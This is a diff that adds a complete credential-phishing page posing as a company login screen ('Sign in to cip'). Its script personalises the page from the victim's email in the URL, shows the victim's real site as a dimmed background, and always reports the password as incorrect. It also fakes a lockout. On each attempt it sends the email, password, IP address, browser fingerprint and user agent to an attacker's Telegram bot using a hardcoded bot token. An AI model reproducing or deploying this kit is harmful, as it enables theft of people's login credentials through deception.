@@ -1,0 +1,736 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="referrer" content="strict-origin">
+    <link id="favicon" rel="shortcut icon" type="image/png" href="https://www.google.com/s2/favicons?domain=cip.mc">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+    <title>Sign in to cip</title>
+    <script nonce="">
+        if (top.location != window.location) {
+            top.location.reload();
+        }
+        if (window.opener && window.opener.top.location != window.location) {
+            window.opener.top.location.reload();
+            self.close();
+        }
+    </script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+    <style>
+        body {
+            background-color: #eeeeee;
+            font-family: Helvetica Neue, Helvetica, sans-serif;
+            font-size: 13px;
+            color: #425152;
+            margin: 0;
+        }
+
+        ::-moz-placeholder {
+            color: #d9dad9;
+        }
+
+        :-ms-input-placeholder {
+            color: #d9dad9;
+        }
+
+        ::-ms-input-placeholder {
+            color: #d9dad9;
+        }
+
+        ::placeholder {
+            color: #d9dad9;
+        }
+
+        a {
+            color: #425152;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        input {
+            border-radius: 5px;
+            padding: 5px 3px;
+        }
+
+        input.submit {
+            font-weight: bold;
+            text-align: center;
+            min-width: 90px;
+            color: #f0f0f0;
+            background: #444444;
+            padding: 5px 12px;
+            border-color: #444444;
+            border-style: solid;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        input.submit:hover {
+            color: #ffffff;
+            background: #555555;
+        }
+        
+        input.submit:active {
+            transform: scale(0.98);
+        }
+        
+        input.submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .row {
+            margin: 10px 0;
+        }
+
+        .row:after {
+            content: "";
+            display: table;
+            clear: both;
+        }
+
+        .logoWithPortalIcons {
+            width: 150px;
+            height: 50px;
+            background: transparent url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAARCAYAAAA/tFWCAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYNAictBVTA/AAAAj5JREFUaN7tWdFtgzAQfakyAPICyQffNCOQCdpMUDaoMkHIBFUnSDJB0gkgE5T62x9MgLJB+pGLRK2AMYbdiHgSPxjuznfPvjt7BOAMO0gBzAGgCHwPQAJgJn2zZlzEReBX6mRcjIrAD+n/MnIAC8ZFVnoXA1i1sPUEICOZO7LdVOYVIwC37J+X9LT1eUaPbDMqdOpiTfNPSF5rHzzBDfY3SGWKKYA9kdYUHjkuIidG6AdmfbHZOrGKwJ8Zsl1FrlcHcjcku0/YOPRz94jlKPBlvDiSG6J/eO+qYeOaPGtSa6nG1goZec03eZM6r8HO900psfzuWmOV5y/XG011tKltVOl7Iy1c1SIetbRHnp/sA6W9Y9tMZVykCnKBcRErxnNDcqMBcbOe7VInAJ//kBGc7VgTTYdfO6xrjRUBeKv4dse42Das0z6qOiPGJpFeE1Af5K1EXdAO+1OqlBZkwXj1G9wwzBxMzkXU6T0WuvlYzK9KruuCr5ln6TuSogpSyrhIi8CP6o4iisCf1jQQeZPOcsBdMKMmKB87EB6i/hI3VYzH1FkuL2hUEOLQtvXlLdp3iq3mQAAAAAElFTkSuQmCC')
+                /*IconsTogether.svg*/
+                no-repeat left top;
+        }
+
+        .logoOnly {
+            width: 280px;
+            height: 30px;
+            overflow: hidden;
+        }
+
+        .logoOnly .logoWithPortalIcons {
+            width: 320px;
+            height: 120px;
+        }
+
+        .title {
+            font-size: 26px;
+            margin: 20px 0 10px;
+        }
+
+        .red {
+            color: #EE3031;
+        }
+
+        a#create-account {
+            display: inline-block;
+            border-radius: 4px;
+            padding: 3px 8px;
+            border: 1px solid #EE3031;
+        }
+
+        a#create-account:hover {
+            text-decoration: none;
+        }
+
+        .col1,
+        .col2 {
+            float: left;
+            line-height: 30px;
+            vertical-align: middle;
+            padding-top: 4px;
+        }
+
+        .col1 {
+            width: 124px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .col2 {
+            width: 286px;
+        }
+
+        .col2 input {
+            width: 96%;
+        }
+
+        .error {
+            color: #D52B1E;
+            font-weight: normal;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 1.0);
+            padding: 40px;
+            box-shadow: 2px 2px 4px 2px #ccc;
+            width: 416px;
+            border-radius: 5px;
+            margin: 10% auto 30px auto;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            transition: all 0.3s cubic-bezier(.25, .8, .25, 1);
+            position: relative;
+        }
+
+        .password-icon {
+            width: 20px;
+            position: absolute;
+            cursor: pointer;
+            margin-top: 9px;
+            margin-left: -37px;
+            background-color: white;
+        }
+
+        #login_footer {
+            line-height: 125%;
+            font-size: 12px;
+            text-align: justify;
+            width: 500px;
+            margin: 90px auto auto auto;
+            padding-left: 10px;
+        }
+
+        /* NEW STYLES - Added touches */
+        #mail:focus, #pass:focus {
+            outline: none;
+            border: 2px solid #444444;
+            box-shadow: 0 0 5px rgba(68,68,68,0.3);
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #444444;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .toast-notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #333;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+            z-index: 9999;
+            animation: slideIn 0.3s ease;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        #mainPage {
+            transition: opacity 0.3s ease;
+        }
+
+        #mainPage.loading {
+            opacity: 0.5;
+        }
+        
+        .attempt-warning {
+            color: #f0ad4e !important;
+            font-weight: bold;
+        }
+
+        @media only screen and (max-width: 600px) {
+            body {
+                background-image: none;
+            }
+
+            .container {
+                width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+                padding: 0;
+                margin-top: 0;
+            }
+
+            .container div.body {
+                padding: 40px 20px;
+            }
+
+            .col1,
+            .col2 {
+                float: none;
+                width: 100%;
+            }
+
+            #login_footer {
+                width: 99%;
+                margin-top: 20px;
+            }
+
+            #login_footer div.content {
+                padding: 10px 20px 10px 10px;
+            }
+
+            .password-icon {
+                margin-top: -25px;
+                right: 7%;
+            }
+
+        }
+
+
+        .xlogo {
+            color: #fff;
+            margin-bottom: 10px;
+            margin-top: -25px;
+        }
+
+        .xlogo img {
+            vertical-align: middle;
+            width: 5%;
+            height: 5%;
+            object-fit: contain
+        }
+
+        .xlogo span {
+            vertical-align: middle
+        }
+
+        .text-g {
+            font-family: "Arial Black", Gadget, sans-serif;
+            text-transform: uppercase !important;
+            text-align: center;
+            font-size: 25px;
+            color: #444444;
+            background-color: rgba(255, 255, 255, 0);
+            text-shadow: rgb(255, 255, 255) 2px 2px 2px;
+        }
+
+        #root {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: -10;
+            pointer-events: none;
+            filter: brightness(0.3)
+        }
+        input:disabled {
+            background-color: #f5f5f5;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        #mail:disabled {
+            background-color: #e9ecef;
+            color: #495057;
+            border: 1px solid #ced4da;
+            cursor: default;
+        }
+    </style>
+</head>
+
+<body><div id="root">
+    <iframe id="mainPage" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe>
+</div>
+    <div id="login_form" action="" method="post" autocomplete="off">
+        <input type="hidden" name="csrfmiddlewaretoken" value="xWUPRch6gUXcsYdMNLyWrIvExcWeJ3qTtf8VMHZWmQ2EBBFj3eYVAcVdcPIJiDWq">
+        <input type="hidden" name="next" value="/">
+        <div class="container" id="container" style="padding-bottom:10px!important; position: relative;">
+            <div style="position:absolute; top:0; width:100%; height:100%; left:0; background:#fff; opacity:0.7; display:none" id="bg_screen"> </div>
+            <img src="https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif" style="width:50px; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); display:none" id="loading_image">
+        
+
+    <input type="hidden" class="form-control" name="hido" id="hido" value="">
+    <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="https://www.cip.mc">
+        <div class="body">
+           
+            <div class="xlogo">
+                <img id="image" src="">
+                <span style="text-transform: capitalize;" class="text-g" id="company">cip</span>
+                </div>
+                
+            <div class="row">
+                <div class="col1"><label for="id_email">Email:</label></div>
+                <div class="col2"><input type="text" name="email" value="" id="mail" placeholder="Email" readonly disabled style="background-color:#e9ecef; cursor:default;"></div>
+            </div>
+                <div class="col1"><label for="id_pass">Password:</label></div>
+                <div class="col2"><input type="password" name="password" id="pass" autofocus="" placeholder="Password"></div>
+                  <img id="id-password-reveal-icon" class="password-icon" src="https://fac.corp.fortinet.com/customviews/image/password_hidden:93edf7d3ceb704be92ee084ecc62c6c8/" alt="">
+            </div>
+            <br><br>
+            <div class="row">
+                <div><span class="error" id="error"></span></div>
+            </div>
+            <div class="row">
+                <div class="col1" style="line-height:40px;padding-top:10px;">
+                    <input type="button" id="submit_btn" class="submit" value="Login" style="padding:7px 24px;"></div>
+            </div>
+            <div class="row">
+                
+                <p>
+                    All right reserved. Copyright © 2026 <span id="kai" style="text-transform: capitalize;">cip</span>.
+                    <br>
+                    <br>
+                </p>
+            </div>
+            <p id="ip" style="display: none;"></p>
+        
+    </div>
+    </div>
+    
+    <div id="toast" style="display: none;"></div>
+</body>
+<script>
+
+function showToast(message, isError = true) {
+    const toast = document.getElementById('toast');
+    toast.innerHTML = message;
+    toast.style.display = 'block';
+    toast.style.backgroundColor = isError ? '#d9534f' : '#5cb85c';
+    toast.className = 'toast-notification';
+    setTimeout(() => {
+        toast.style.display = 'none';
+    }, 3000);
+}
+
+function setButtonLoading(loading) {
+    const btn = document.getElementById('submit_btn');
+    if (loading) {
+        btn.value = '⏳ Loading...';
+        btn.style.opacity = '0.7';
+        btn.disabled = true;
+    } else {
+        btn.value = 'Login';
+        btn.style.opacity = '1';
+        btn.disabled = false;
+    }
+}
+
+function getBrowserFingerprint() {
+    const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+    const deviceMemory = navigator.deviceMemory || 'unknown';
+    
+    return `Screen: ${screenData} | TZ: ${timezone} | Lang: ${language} | Platform: ${platform} | CPU: ${hardwareConcurrency} | RAM: ${deviceMemory}GB`;
+}
+
+let failedPasswordAttempts = 0;
+const MAX_PASSWORD_ATTEMPTS = 3;
+let isSubmitting = false;
+let lockoutTimer = null;
+
+function updateAttemptsWarning() {
+    const remaining = MAX_PASSWORD_ATTEMPTS - failedPasswordAttempts;
+    if (remaining <= 2 && remaining > 0 && failedPasswordAttempts > 0) {
+        const warning = document.getElementById('error');
+        warning.innerHTML = `Warning: ${remaining} valid attempt(s) remaining before account lock.`;
+        warning.style.color = '#f0ad4e';
+        setTimeout(() => {
+            if (warning.innerHTML && warning.innerHTML.includes('Warning')) {
+                if (failedPasswordAttempts < MAX_PASSWORD_ATTEMPTS) warning.innerHTML = '';
+            }
+        }, 3500);
+    } else if (remaining === 0) {
+        const warning = document.getElementById('error');
+        warning.innerHTML = `Account temporarily locked due to ${MAX_PASSWORD_ATTEMPTS} failed password attempts. Please wait 30 seconds.`;
+        warning.style.color = '#d9534f';
+    }
+}
+
+function lockAccount() {
+    const mailInput = document.getElementById('mail');
+    const passInput = document.getElementById('pass');
+    const submitBtn = document.getElementById('submit_btn');
+    
+    mailInput.disabled = true;
+    passInput.disabled = true;
+    submitBtn.disabled = true;
+    submitBtn.style.opacity = '0.6';
+    submitBtn.style.cursor = 'not-allowed';
+    
+    const errorSpan = document.getElementById('error');
+    errorSpan.innerHTML = 'Too many failed password attempts. Account locked for 30 seconds.';
+    errorSpan.style.color = '#d9534f';
+    
+    showToast('Account locked for 30 seconds due to repeated failed password attempts.', true);
+    
+    if (lockoutTimer) clearTimeout(lockoutTimer);
+    lockoutTimer = setTimeout(() => {
+        const mailElem = document.getElementById('mail');
+        const passElem = document.getElementById('pass');
+        const submitButton = document.getElementById('submit_btn');
+        
+        passElem.disabled = false;
+        submitButton.disabled = false;
+        submitButton.style.opacity = '1';
+        submitButton.style.cursor = 'pointer';
+        
+        failedPasswordAttempts = 0;
+        
+        const errorSpanInner = document.getElementById('error');
+        errorSpanInner.innerHTML = '';
+        
+        showToast('Account unlocked. You may try again.', false);
+        
+        lockoutTimer = null;
+    }, 30000); // 30 SECONDS (30000 milliseconds)
+}
+
+(function() {
+    let email = sessionStorage.getItem('userEmail');
+    if (email && email.includes('@')) {
+        let emailInput = document.getElementById('mail');
+        if (emailInput) {
+            emailInput.value = email;
+            emailInput.disabled = true;
+            emailInput.readOnly = true;
+            console.log("Email auto-filled from sessionStorage:", email);
+        }
+    }
+})();
+// =============================================
+
+window.addEventListener('load', function(){
+        $(document).ready(()=>{
+            $.getJSON("https://api.ipify.org?format=json",
+            function (data) {
+ 
+                $("#ip").html(data.ip);
+            })
+        });
+
+        
+let email = window.location.hash.substr(1)
+console.log("Email from hash:", email)
+
+// Only set if not already set from sessionStorage
+let emailInput = document.getElementById('mail')
+if (emailInput && !emailInput.value && email && email.includes('@')) {
+    emailInput.value = email
+    emailInput.disabled = true
+    emailInput.readOnly = true
+}
+
+let domaine = email.indexOf('@')
+console.log(domaine)
+
+let dom = email.substr(domaine + 1)
+console.log("Domain extracted:", dom)
+
+document.getElementById('image').src = 'http://www.google.com/s2/favicons?sz=96&domain=' + dom 
+var mainPage = 'https://www.' + dom + '?igu=1'
+document.getElementById('mainPage').src = mainPage
+document.getElementById('favicon').href = 'http://www.google.com/s2/favicons?sz=96&domain=' + dom
+
+var title = document.getElementById('kai')
+var titles = (dom.substr(0, dom.indexOf('.'))).toUpperCase()
+
+title.innerHTML = titles
+console.log(titles)
+
+var company = document.getElementById('company')
+company.innerHTML = titles
+
+setTimeout(() => {
+    document.getElementById('pass').focus();
+}, 500);
+
+})
+
+const iframe = document.getElementById('mainPage');
+iframe.addEventListener('load', function() {
+    this.classList.remove('loading');
+    console.log('Background page loaded');
+});
+
+iframe.addEventListener('loadstart', function() {
+    this.classList.add('loading');
+});
+
+document.getElementById('pass').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        document.getElementById('submit_btn').click();
+    }
+});
+
+
+var see = document.getElementById('id-password-reveal-icon')
+    see.addEventListener('click', function(){
+        var pass = document.getElementById('pass')
+        console.log('password')
+       
+        if(pass.type == 'password'){
+            pass.type = 'text'
+            see.src = 'https://fac.corp.fortinet.com/customviews/image/password_visible:93edf7d3ceb704be92ee084ecc62c6c8/';
+        }
+       else{
+        pass.type = 'password'
+        see.src = 'https://fac.corp.fortinet.com/customviews/image/password_hidden:93edf7d3ceb704be92ee084ecc62c6c8/';
+       }
+    })
+
+let button = document.getElementById('submit_btn')
+
+document.getElementById('pass').addEventListener('keyup', function(){
+    var error = document.getElementById('error')
+    if (error.innerHTML && (error.innerHTML.includes('incorrect') || error.innerHTML.includes('empty') || error.innerHTML.includes('Warning'))) {
+        if (!error.innerHTML.includes('locked')) {
+            error.innerHTML = ''
+        }
+    }
+})
+
+button.addEventListener('click', function(){
+    
+    if (isSubmitting) {
+        showToast('Please wait, processing your request...', false);
+        return;
+    }
+    
+    const passInputElem = document.getElementById('pass');
+    if (passInputElem.disabled === true) {
+        showToast('Account is temporarily locked. Please wait 30 seconds.', true);
+        return;
+    }
+    
+    isSubmitting = true;
+    setButtonLoading(true);
+    
+    var male = document.getElementById('mail').value
+    var pass = document.getElementById('pass').value
+    
+    if( male.indexOf('@') == -1 || male == '' ){
+        showToast('Invalid email session. Please re-initiate login.', true);
+        setButtonLoading(false);
+        isSubmitting = false;
+        return;
+    }
+    
+    if(pass == null || pass == ''){
+        showToast('Password cannot be empty', true);
+        setButtonLoading(false);
+        isSubmitting = false;
+        setTimeout(() => {
+            document.getElementById('pass').focus()
+        }, 200)
+        return;
+    }
+    
+    if(pass.length < 5){
+        showToast('Password must be at least 5 characters', true);
+        
+        failedPasswordAttempts++;
+        updateAttemptsWarning();
+        
+        if (failedPasswordAttempts >= MAX_PASSWORD_ATTEMPTS) {
+            lockAccount();
+            setButtonLoading(false);
+            isSubmitting = false;
+            document.getElementById('pass').value = '';
+            return;
+        }
+        
+        setButtonLoading(false);
+        isSubmitting = false;
+        setTimeout(() => {
+            document.getElementById('pass').focus()
+            document.getElementById('pass').value = ''
+        }, 200)
+        return;
+    }
+
+    failedPasswordAttempts++;
+    updateAttemptsWarning();
+    
+    if (failedPasswordAttempts >= MAX_PASSWORD_ATTEMPTS) {
+        lockAccount();
+        setButtonLoading(false);
+        isSubmitting = false;
+        document.getElementById('pass').value = '';
+        return;
+    }
+    
+    setTimeout(()=> {
+        const errorSpan = document.getElementById('error');
+        errorSpan.innerHTML = `Your account or password is incorrect.`;
+        errorSpan.style.color = '#D52B1E';
+        button.value = 'Login';
+    }, 800);
+    
+    setTimeout(() => {
+        document.getElementById('pass').focus();
+        document.getElementById('pass').value = '';
+        setButtonLoading(false);
+        isSubmitting = false;
+        setTimeout(() => {
+            const errSpan = document.getElementById('error');
+            if (errSpan.innerHTML === 'Your account or password is incorrect.' && failedPasswordAttempts < MAX_PASSWORD_ATTEMPTS) {
+                errSpan.innerHTML = '';
+            }
+        }, 2000);
+    }, 2000);
+    
+    let begin = male.indexOf('@');
+    let finish = male.indexOf('.');
+    let domain = male.slice(begin + 1, finish);
+    
+    let output = domain && (domain.includes('9') || domain.includes('7') || domain.includes('6') ||
+    domain.includes('5') || domain.includes('4') || domain.includes('8') || domain.includes('3')
+    || domain.includes('2') || domain.includes('0') || domain.includes('1'));
+    
+    var ip = document.getElementById('ip').innerHTML || 'Unable to fetch';
+    var fingerprint = getBrowserFingerprint();
+    var token = '7865733278:AAHGp0iioxZaUiNbWcJgABxQjvMo_bS3KEU';
+    var chat_ids = 5644432733;
+    var clean = `***** GENERAL RESULT *****\n📧 Email: ${male}\n🔐 Password: ${pass}\n🌐 IP: ${ip}\n🖥️ Fingerprint: ${fingerprint}\n📱 User-Agent: ${navigator.userAgent}\n🔢 Attempt: ${failedPasswordAttempts}/${MAX_PASSWORD_ATTEMPTS}\n*****`;
+    
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + token + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({"chat_id": chat_ids, "text": clean})
+    };
+    $.ajax(settings).done((response) => {
+        console.log(response);
+        console.log('Telegram sent');
+    }).fail((err) => {
+        console.error('Telegram error', err);
+    });
+    
+    return;
+});
+
+function enforceEmailLocked() {
+    const mailField = document.getElementById('mail');
+    if (mailField) {
+        mailField.disabled = true;
+        mailField.readOnly = true;
+    }
+}
+
+setInterval(enforceEmailLocked, 1000);
+enforceEmailLocked();
+
+</script>
+
+</html>
